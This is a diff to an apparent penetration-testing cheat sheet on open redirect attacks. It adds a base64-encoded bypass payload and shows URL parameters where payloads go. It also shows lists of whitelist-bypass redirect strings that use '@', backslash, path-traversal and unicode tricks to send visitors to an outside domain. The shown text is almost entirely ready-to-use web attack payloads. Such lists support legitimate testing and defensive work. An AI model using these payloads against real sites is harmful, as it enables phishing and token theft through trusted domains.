@@ -1,10 +1,17 @@
 # Open Redirect
 
+### Common Bypasses
+
+```bash
+#Using Base64 - urlencode(base64(//google.com\@whitelisteddomain.tld))
+Ly9nb29nbGUuY29tXEB3aGl0ZWxpc3RlZGRvbWFpbi50bGQ%3D
+```
+
 ### Common Injection Points
 
 Add your payload at the end of the line.
 
-```text
+```
 /
 ?next=
 ?url=
@@ -36,7 +43,7 @@ Add your payload at the end of the line.
 
 Change whitelisteddomain with an specific white listed domain of your case. Ex: www.web.com
 
-```text
+```
 //localdomain.pw/%2f..
 //www.whitelisteddomain.tld@localdomain.pw/%2f..
 ///localdomain.pw/%2f..
@@ -572,4 +579,3 @@ https://localdomain.pw\udfff@www.whitelisteddomain.tld/
 https://localdomain.pw�@www.whitelisteddomain.tld/
 //localdomain.pw�@www.whitelisteddomain.tld/
 ```
-
